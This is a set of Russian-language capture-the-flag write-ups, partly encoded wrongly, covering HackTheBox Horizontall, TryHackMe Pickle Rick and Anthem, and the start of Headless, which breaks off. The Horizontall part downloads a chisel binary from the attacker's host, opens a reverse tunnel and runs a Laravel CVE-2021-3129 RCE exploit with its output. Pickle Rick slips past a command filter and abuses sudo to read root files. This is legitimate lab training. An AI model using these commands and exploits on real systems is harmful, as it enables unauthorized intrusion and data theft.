[kali@kali ~]$ cp /usr/bin/chisel .
[kali@kali ~]$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
...
strapi@horizontall:~/myapi$ wget http://10.10.14.243:80/chisel
wget http://10.10.14.243:80/chisel
--2022-01-09 15:18:38--  http://10.10.14.243/chisel
Connecting to 10.10.14.243:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8750072 (8.3M) [application/octet-stream]
Saving to: ‚Äòchisel.1‚Äô

chisel.1            100%[===================>]   8.34M  7.27MB/s    in 1.1s    

2022-01-09 15:18:40 (7.27 MB/s) - ‚Äòchisel.1‚Äô saved [8750072/8750072]

strapi@horizontall:~/myapi$ chmod a+x chisel
```

```
[kali@kali ~]$ chisel server -p 1234 --reverse  
2022/01/09 10:03:21 server: Reverse tunnelling enabled
2022/01/09 10:03:21 server: Fingerprint agr0rkd/+jKcuiD83s9b2zKVGbRv6r07aAVo6oRGxmg=
...
strapi@horizontall:~/myapi$ ./chisel client 10.10.14.243:1234 R:8080:127.0.0.1:8000
<isel client 10.10.14.243:1234 R:8080:127.0.0.1:8000
2022/01/09 15:24:41 client: Connecting to ws://10.10.14.243:1234
2022/01/09 15:24:41 client: Connected (Latency 51.978835ms)
```

–ú—ã –≤–∏–¥–∏–º –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—É Laravel, –µ—Å–ª–∏ –∏—â–µ–º ¬´–≠–∫—Å–ø–ª–æ–π—Ç –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏ –ø–æ—Ä—Ç–æ–≤ Lavarel¬ª, –º—ã –Ω–∞—Ö–æ–¥–∏–º [https://github.com/nth347/CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit) . –ò—Ç–∞–∫, –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º —ç—Ç–æ

```
[kali@kali ~]$ /exploit.py http://localhost:8080 Monolog/RCE1 "cat /root/root.txt"
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 2776, done.
remote: Counting objects: 100% (1118/1118), done.
remote: Compressing objects: 100% (640/640), done.
remote: Total 2776 (delta 459), reused 955 (delta 334), pack-reused 1658
Receiving objects: 100% (2776/2776), 412.30 KiB | 1.93 MiB/s, done.
Resolving deltas: 100% (1101/1101), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited
```



---
# Pickle Rick

**–ü–ª–æ—à–∞–¥–∫–∞:** https://tryhackme.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy

![[Pasted image 20240417165524.png]]

**–ó–∞–¥–∞–Ω–∏–µ 1 (–ü–∏–∫–ª –†–∏–∫)**

–≠—Ç–æ —Ç–µ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –∑–∞–¥–∞–Ω–∏–µ ¬´–†–∏–∫ –∏ –ú–æ—Ä—Ç–∏¬ª —Ç—Ä–µ–±—É–µ—Ç –æ—Ç –≤–∞—Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –∏ –Ω–∞–π—Ç–∏ 3 –∏–Ω–≥—Ä–µ–¥–∏–µ–Ω—Ç–∞, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–º–æ–≥—É—Ç –†–∏–∫—É –ø—Ä–∏–≥–æ—Ç–æ–≤–∏—Ç—å –∑–µ–ª—å–µ, —á—Ç–æ–±—ã —Å–Ω–æ–≤–∞ –ø—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å—Å—è –≤ —á–µ–ª–æ–≤–µ–∫–∞ –∏–∑ —Ä–∞—Å—Å–æ–ª–∞.
–†–∞–∑–≤–µ—Ä–Ω–∏—Ç–µ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—É—é –º–∞—à–∏–Ω—É –¥–ª—è —ç—Ç–æ–π –∑–∞–¥–∞—á–∏ –∏ –∏–∑—É—á–∏—Ç–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ: `<ip>`

–í—ã —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—é, –∏—Å–ø–æ–ª—å–∑—É—è —Å–ª–µ–¥—É—é—â—É—é —Å—Å—ã–ª–∫—É:¬†[https://10-10-216-57.p.thmlabs.com](https://10-10-216-57.p.thmlabs.com/)¬†(–æ–Ω–æ –æ–±–Ω–æ–≤–∏—Ç—Å—è –ø–æ—Å–ª–µ –ø–æ–ª–Ω–æ–≥–æ –∑–∞–ø—É—Å–∫–∞ –º–∞—à–∏–Ω—ã)

## –†–∞–∑–≤–µ–¥–∫–∞

**–î–æ–º–∞—à–Ω—è—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞**

–ó–¥–µ—Å—å –æ—Å–æ–±–æ –Ω–µ –Ω–∞ —á—Ç–æ —Å–º–æ—Ç—Ä–µ—Ç—å –∏ —á–µ–º –∑–∞–Ω—è—Ç—å—Å—è. –ò—Ç–∞–∫, –¥–∞–≤–∞–π—Ç–µ –¥–≤–∏–≥–∞—Ç—å—Å—è –¥–∞–ª—å—à–µ.

**–ò—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥**

–î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥. –ó–¥–µ—Å—å –Ω–∞—Ö–æ–¥–∏–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:

![[Pasted image 20240417165849.png]]

–î–∞–≤–∞–π—Ç–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ —ç—Ç–æ –∑–∞–ø–æ–º–Ω–∏–º. –ù–æ –ø–æ–∫–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –µ–≥–æ –Ω–µ–≥–¥–µ.

–í–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—ã –æ–±—ã—á–Ω–æ –∑–∞–ø—É—Å–∫–∞—é—Ç—Å—è —á–µ—Ä–µ–∑ –ø–æ—Ä—Ç 80 (HTTP) –∏ 443 (HTTPS), –Ω–æ –∏—Ö –º–æ–∂–Ω–æ –∑–∞–ø—É—Å–∫–∞—Ç—å —á–µ—Ä–µ–∑ –ª—é–±–æ–π –ø–æ—Ä—Ç, –ø–æ—ç—Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –≤–æ—Å–ø–æ–ª—å–∑—É–µ–º—Å—è NMap, —á—Ç–æ–±—ã —É–∑–Ω–∞—Ç—å –±–æ–ª—å—à–µ.

**_nmap -sS -Pn -T4 -p- 10.10.129.55_**

![[Pasted image 20240417170001.png]]

**Nikto** ‚Äî —Å–∫–∞–Ω–µ—Ä –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–æ–≤. –û–Ω –≤—ã–≤–æ–¥–∏—Ç —Å–ª–µ–¥—É—é—â–µ–µ (nikto -h <ip):

![[Pasted image 20240417170101.png]]

–ò–Ω—Ç–µ—Ä–µ—Å–Ω–æ. –û–Ω –Ω–∞—à–µ–ª —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ö–æ–¥–∞! –≠—Ç–æ —Ç–∞–∫–∂–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ –º—ã –∏–º–µ–µ–º –¥–µ–ª–æ —Å PHP. –î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ —ç—Ç–æ –ø–æ–∑–∂–µ, –ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –º—ã –≤–æ—Å–ø–æ–ª—å–∑—É–µ–º—Å—è gobuster.

–ú—ã —Ç–∞–∫–∂–µ –Ω–∞—à–ª–∏ —Ñ–∞–π–ª robots.txt. –†–æ–±–æ—Ç—ã¬†.**‚Äã**¬†**txt**¬†—Å–æ–æ–±—â–∞–µ—Ç –ø–æ–∏—Å–∫–æ–≤—ã–º —Ä–æ–±–æ—Ç–∞–º, –∫ –∫–∞–∫–∏–º URL-–∞–¥—Ä–µ—Å–∞–º —Å–∫–∞–Ω–µ—Ä –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –Ω–∞ –≤–∞—à–µ–º —Å–∞–π—Ç–µ. –ß–∞—Å—Ç–æ —ç—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å—Ç–æ—á–Ω–∏–∫–æ–º —Ü–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ CTF. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ —Ñ–∞–π–ª **robots.txt** —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –∏ —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–ª–µ–¥—É—é—â–∏–π —Ç–µ–∫—Å—Ç:

```
Wubbalubbadubdub
```

–•–º?

## –ü–æ–∏—Å–∫ —Å–∫—Ä—ã—Ç—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤

Gobuster –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –ø–µ—Ä–µ–±–æ—Ä–∞ –∫–∞—Ç–∞–ª–æ–≥–æ–≤ –∏ —Ñ–∞–π–ª–æ–≤ –Ω–∞ –≤–µ–±-—Å–∞–π—Ç–µ. –î–∞–≤–∞–π—Ç–µ –∑–∞–ø—É—Å—Ç–∏–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ gobuster, —á—Ç–æ–±—ã –ø–æ–Ω—è—Ç—å —Å—Ç—Ä—É–∫—Ç—É—Ä—É –∫–∞—Ç–∞–ª–æ–≥–æ–≤ –≤–µ–±-—Å–∞–π—Ç–∞:

```
gobuster dir -u 10.10.129.55 -w /usr/share/wordlists/dirbuster/—Å–ø–∏—Å–æ–∫-–∫–∞—Ç–∞–ª–æ–≥–æ–≤-2.3-medium.txt
```

![[Pasted image 20240417170423.png]]

gobuster –Ω–∞—à–µ–ª –¥–≤–∞ –∫–∞—Ç–∞–ª–æ–≥–∞: assets –∏ server-status. –£ –Ω–∞—Å –Ω–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ –ø–æ—Å–µ—â–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ —Å–µ—Ä–≤–µ—Ä–∞, –Ω–æ –¥–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ assets:

![[Pasted image 20240417170608.png]]

–§–∞–π–ª—ã .js –∫–∞–∂—É—Ç—Å—è –Ω–æ—Ä–º–∞–ª—å–Ω—ã–º–∏, –∫–∞–∫ –∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ.

–î–∞–≤–∞–π—Ç–µ —Å–Ω–æ–≤–∞ –∑–∞–ø—É—Å—Ç–∏–º gobuster, –Ω–æ —Ç–µ–ø–µ—Ä—å —Å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –∏—Å–∫–∞—Ç—å. –ú—ã –∑–Ω–∞–µ–º, —á—Ç–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —Ä–∞–±–æ—Ç–∞–µ—Ç PHP, –∏ –ø–æ—ç—Ç–æ–º—É –º—ã –º–æ–∂–µ–º –∏—Å–∫–∞—Ç—å —Ñ–∞–π–ª—ã —ç—Ç–æ–≥–æ —Ç–∏–ø–∞, –∞ —Ç–∞–∫–∂–µ –¥—Ä—É–≥–∏–µ —Ñ–∞–π–ª—ã .html –∏ .txt.

–°–µ–π—á–∞—Å –º—ã –≥–æ–≤–æ—Ä–∏–º:

![[Pasted image 20240417170648.png]]

–ú–Ω–æ–≥–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ –∏ —Å—Ç—Ä–∞–Ω–∏—Ü. –ú—ã –Ω–∞—à–ª–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—É login.php:

## –ü–µ—Ä–µ—Ö–æ–¥ –ø–æ –Ω–∞–π–¥–µ–Ω–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ

![[Pasted image 20240417170704.png]]

–ò —Å—Ç—Ä–∞–Ω–∏—Ü—ã portal.php –∏ dened.php, –∫–æ—Ç–æ—Ä—ã–µ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç 302 (–≤—Ä–µ–º–µ–Ω–Ω–æ –ø–µ—Ä–µ–º–µ—â–µ–Ω—ã).

–î–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ö–æ–¥–∞ –Ω–∞ –ø–æ—Ä—Ç–∞–ª. –£ –Ω–∞—Å –µ—Å—Ç—å –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: R1ckRul3s, –∞ —Ç–∞–∫–∂–µ –º—ã –Ω–∞—à–ª–∏ —Ç–µ–∫—Å—Ç Wubbalubbadubdub –≤ —Ñ–∞–π–ª–µ **robots.txt**. –ú–æ–∂–µ—Ç —ç—Ç–æ –ø–∞—Ä–æ–ª—å?

–£–†–ê!

![[Pasted image 20240417172255.png]]

–î—É–º–∞—é, –ø—Ä–∏—à–ª–æ –≤—Ä–µ–º—è –¥–ª—è –≤–≤–µ–¥–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥!

![[Pasted image 20240417172307.png]]

–ü–æ—Å–º–æ—Ç—Ä–∏ –Ω–∞ —ç—Ç–æ! –¢–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª —Å –∏–º–µ–Ω–µ–º Sup3rPickl3Ingred.txt. –ö–∞–∂–µ—Ç—Å—è, —ç—Ç–æ —Å—Ç–æ–∏—Ç –ø—Ä–æ–≤–µ—Ä–∏—Ç—å.

![[Pasted image 20240417172330.png]]

–ù–∞–º –Ω–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É cat :(

![[Pasted image 20240417172414.png]]

–ö —Å—á–∞—Å—Ç—å—é, –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä—É–≥–∏–µ –∫–æ–º–∞–Ω–¥—ã –¥–ª—è —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞. **nano**? –ù–µ—Ç.. **less**? –î–ê! –¢–∞–∫ —Ç–æ–∂–µ –≤–æ–∑–º–æ–∂–Ω–æ.
–ö–æ–º–∞–Ω–¥—É **tac** —Ç–æ–∂–µ –≤–æ–∑–º–æ–∂–Ω–æ.

![[Pasted image 20240417172542.png]]

–ü—Ä–æ–¥–æ–ª–∂–∏–º –≤–≤–æ–¥–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã. –ï—Å–ª–∏ –º—ã –Ω–∞–ø–∏—à–µ–º tacportal.php, –º—ã —Å–º–æ–∂–µ–º –ø—Ä–æ—á–∏—Ç–∞—Ç—åportal.php. –ú—ã –≤–∏–¥–∏–º –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π –∫–æ–¥:

![[Pasted image 20240417172613.png]]

–≠—Ç–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞–º –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã.

–ü–æ—Ö–æ–∂–µ, sudo –Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ. –ú—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å sudo -l –¥–ª—è –≤—ã–≤–æ–¥–∞ —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö –∫–æ–º–∞–Ω–¥, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:

![[Pasted image 20240417172624.png]]

–≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –º—ã –º–æ–∂–µ–º –∑–∞–ø—É—Å–∫–∞—Ç—å –≤—Å–µ –∫–æ–º–∞–Ω–¥—ã (–Ω—É, –∫—Ä–æ–º–µ 7-–º–∏, —É–ø–æ–º—è–Ω—É—Ç—ã—Ö –≤—ã—à–µ) –±–µ–∑ –ø–∞—Ä–æ–ª—è!

–ü—Ä–µ–∂–¥–µ —á–µ–º –¥–≤–∏–≥–∞—Ç—å—Å—è –¥–∞–ª—å—à–µ, –≤–∞–∂–Ω–æ –∑–∞–ø–æ–º–Ω–∏—Ç—å –Ω–∞–π–¥–µ–Ω–Ω—ã–π –∫–ª—é—á.txt. –∫–æ—Ç–æ—Ä—ã–π –≥–æ–≤–æ—Ä–∏—Ç:

> _–û—Å–º–æ—Ç—Ä–∏—Ç–µ —Ñ–∞–π–ª–æ–≤—É—é —Å–∏—Å—Ç–µ–º—É –≤ –ø–æ–∏—Å–∫–∞—Ö –¥—Ä—É–≥–æ–≥–æ –∏–Ω–≥—Ä–µ–¥–∏–µ–Ω—Ç–∞._

–¢–∞–∫ —á—Ç–æ –Ω–∞–º —Å–ª–µ–¥—É–µ—Ç –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω–æ –∏–∑—É—á–∏—Ç—å —Ñ–∞–π–ª–æ–≤—É—é —Å–∏—Å—Ç–µ–º—É!

![[Pasted image 20240417172726.png]]

–í –∫–æ—Ä–Ω–µ –Ω–∏—á–µ–≥–æ. –î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º –≤ –¥–æ–º–∞—à–Ω—é—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é.

![[Pasted image 20240417172738.png]]

–ò–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π. –î–∞–≤–∞–π—Ç–µ –∑–∞–≥–ª—è–Ω–µ–º –≤ –¥–æ–º–∞—à–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ –†–∏–∫–∞. –í–æ—Ç –º—ã:

![[Pasted image 20240417172758.png]]

–ü—Ä–æ—á—Ç–∏—Ç–µ –µ–≥–æ, —á—Ç–æ–±—ã –Ω–∞–π—Ç–∏ –≤—Ç–æ—Ä–æ–π –∏–Ω–≥—Ä–µ–¥–∏–µ–Ω—Ç:

![[Pasted image 20240417172813.png]]

–ù–∞–∫–æ–Ω–µ—Ü, –º—ã –º–æ–∂–µ–º –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –¥–æ–º–∞—à–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root. –ß—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å —Ñ–∞–π–ª—ã –≤ —ç—Ç–æ–º –∫–∞—Ç–∞–ª–æ–≥–µ, –Ω–∞–º –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å sudo –ø–µ—Ä–µ–¥ ls:

![[Pasted image 20240417172829.png]]

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ 3rd.txt —Å tac –∏–ª–∏ less:


![[Pasted image 20240417172846.png]]

–ú—ã —Å–¥–µ–ª–∞–ª–∏!

**–í–æ–ø—Ä–æ—Å—ã:**

**–ö–∞–∫–æ–π –∏–Ω–≥—Ä–µ–¥–∏–µ–Ω—Ç –Ω—É–∂–µ–Ω –†–∏–∫—É –≤ –ø–µ—Ä–≤—É—é –æ—á–µ—Ä–µ–¥—å?**

> **_–û—Ç–≤–µ—Ç_**¬†: mr. meeseek hair

**–ö–∞–∫–æ–π –≤—Ç–æ—Ä–æ–π –∏–Ω–≥—Ä–µ–¥–∏–µ–Ω—Ç –Ω—É–∂–µ–Ω –†–∏–∫—É?**

> **_–û—Ç–≤–µ—Ç_**¬†: 1 jerry tear

**–ö–∞–∫–æ–π –ø–æ—Å–ª–µ–¥–Ω–∏–π –∏–Ω–≥—Ä–µ–¥–∏–µ–Ω—Ç –Ω—É–∂–µ–Ω –†–∏–∫—É?**

> **_–û—Ç–≤–µ—Ç_**¬†: fleeb juice

–≠—Ç–æ –±—ã–ª–æ –ø–æ—Ç—Ä—è—Å–∞—é—â–µ. –≠—Ç–æ –±—ã–ª –º–æ–π –ø–µ—Ä–≤—ã–π CTF, –∏ –º–Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ –Ω—É–∂–Ω–æ –±—ã–ª–æ —É–¥–µ—Ä–∂–∞—Ç—å—Å—è –æ—Ç –ª–∏—à–Ω–∏—Ö —Ä–∞–∑–¥—É–º–∏–π :)

–í –∫–æ–Ω—Ü–µ –∫–æ–Ω—Ü–æ–≤, –≤—Å–µ, —á—Ç–æ –ø–æ—Ç—Ä–µ–±–æ–≤–∞–ª–æ—Å—å, ‚Äî —ç—Ç–æ –Ω–µ–º–Ω–æ–≥–æ –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ –∏ —Ñ–∞–π–ª cookie.txt, –∞ –∑–∞—Ç–µ–º –≤–≤–µ—Å—Ç–∏ –∫–æ–º–∞–Ω–¥—É :)


---

# Anthem

**–ü–ª–æ—à–∞–¥–∫–∞:** https://tryhackme.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy

![[Pasted image 20240829133623.png]]

–ó–∞–¥–∞—á–∞ Windows CTF –¥–ª—è –Ω–∞—á–∏–Ω–∞—é—â–∏—Ö. –≠—Ç–æ –ø–æ—à–∞–≥–æ–≤–æ–µ —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ –Ω–∞–ø–∏—Å–∞–Ω–æ –∫–∞–∫ —á–∞—Å—Ç—å –º–∞–≥–∏—Å—Ç–µ—Ä—Å–∫–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞ –ø–æ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (Red Team), –∫–æ—Ç–æ—Ä—ã–π —è –ø–æ–ª—É—á–∞—é –≤ HackerU.

–ö–æ–≥–¥–∞ –º—ã –≤—ã–ø–æ–ª–Ω—è–µ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ nmap, –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º, —á—Ç–æ –ø–æ—Ä—Ç 80 –æ—Ç–∫—Ä—ã—Ç –∏ –Ω–∞ –Ω–µ–º —Ä–∞–±–æ—Ç–∞–µ—Ç **umbraco CMS** (—Å–∏—Å—Ç–µ–º–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º). –ö–æ–ø–Ω—É–≤ –Ω–µ–º–Ω–æ–≥–æ –≥–ª—É–±–∂–µ, –º—ã –ø–æ–π–º–µ–º, –∫–∞–∫ ¬´–æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è¬ª, —É–ø—Ä–∞–≤–ª—è—é—â–∞—è —Å–µ—Ä–≤–µ—Ä–æ–º, —Å–æ–∑–¥–∞–µ—Ç –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∏—Å–ø–æ–ª—å–∑—É—è **–∏–Ω–∏—Ü–∏–∞–ª—ã –∏–º–µ–Ω–∏ –∏ —Ñ–∞–º–∏–ª–∏–∏** –∏ –µ—Å—Ç—å –ø–æ–¥—Å–∫–∞–∑–∫–∞ –æ —Ç–æ–º, –∫–∞–∫ –ø–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ù–∞–π–¥—è —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, –º—ã –≤—Ö–æ–¥–∏–º –≤ —Å–∏—Å—Ç–µ–º—É —Å –ø–æ–º–æ—â—å—é RDP (–ø—Ä–æ—Ç–æ–∫–æ–ª —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞), –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Ñ–∞–π–ª–∞–º, –∫–æ—Ç–æ—Ä—ã–µ –±—ã–ª–∏ –Ω–µ–¥–∞–≤–Ω–æ –∏–∑–º–µ–Ω–µ–Ω—ã, –∏ –Ω–∞—Ö–æ–¥–∏–º —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –¥–∞–µ—Ç –Ω–∞–º —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞. –ë–µ–∑ –¥–æ–ª–≥–∏—Ö —Å–ª–æ–≤, –¥–∞–≤–∞–π—Ç–µ –ø—Ä—ã–≥–Ω–µ–º

## –†–∞–∑–≤–µ–¥–∫–∞

–ù–∞—á–∏–Ω–∞–µ–º —Å–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è nmap.

```
nmap -sS -sV -A <IP>
```

![[Pasted image 20240829133841.png]]

–ú—ã –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º 2 –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–∞ 80 –∏ 3389. –ü–æ—Ä—Ç 80 –æ—Ç–∫—Ä—ã—Ç, –∑–Ω–∞—á–∏—Ç, –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤–µ–±-—Å–∞–π—Ç.

![[Pasted image 20240829133855.png]]

![[Pasted image 20240829133901.png]]

–î–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ –Ω–∞–º –ø—Ä–∏–≥–æ—Ç–æ–≤–∏–ª —Å–∞–π—Ç.

![[Pasted image 20240829133914.png]]

–ú—ã –º–æ–∂–µ–º –Ω–∞–π—Ç–∏ –Ω–∞—à—É –ø–µ—Ä–≤—É—é –ø–∞—Ä—É —Ñ–ª–∞–≥–æ–≤, –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã –∏ –ø—Ä–æ–≤–µ—Ä—è—è –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ —Å—Ç—Ä–∞–Ω–∏—Ü—ã. –û–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ —Å —ç—Ç–∏–º –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è dirbuster –¥–ª—è –ø–æ–∏—Å–∫–∞ –≤–µ–±-–∫–∞—Ç–∞–ª–æ–≥–æ–≤.

–ü—Ä–æ–≤–µ—Ä–∫–∞ `robots.txt`

![[Pasted image 20240829133946.png]]

–ó–¥–µ—Å—å –º–æ–∂–µ—Ç –±—ã—Ç—å —á—Ç–æ-–Ω–∏–±—É–¥—å –ø–∏–∫–∞–Ω—Ç–Ω–æ–µ –∏ –µ—â–µ –æ–¥–∏–Ω —Ñ–ª–∞–≥.

![[Pasted image 20240829134034.png]]


![[Pasted image 20240829133955.png]]

–ò—Ç–∞–∫, –º—ã –∑–Ω–∞–µ–º `UmbracoIsTheBest!` —ç—Ç–æ –≤–æ–∑–º–æ–∂–Ω—ã–π –ø–∞—Ä–æ–ª—å –¥–ª—è –Ω–µ–∫–æ—Ç–æ—Ä–æ–≥–æ –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É


![[Pasted image 20240829134059.png]]




---
# Headless

**–ü–ª–æ—à–∞–¥–∫–∞:** https://hackthebox.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy
**–ó–∞–¥–∞—á–∞:** –ù–∞–π—Ç–∏ —Ñ–∞–π–ª **flag.txt**

## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ 

–Ø –Ω–∞—á–∞–ª —Å –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –ø–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω—ã—Ö —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–π nmap.

```
10.10.11.8
```

–ï—Å–ª–∏ —Ö–æ—Ç–∏—Ç–µ –±–æ–ª–µ–µ –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é:

```
nmap -SC -ST -SV 10.10.11.8
```

- -sC –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
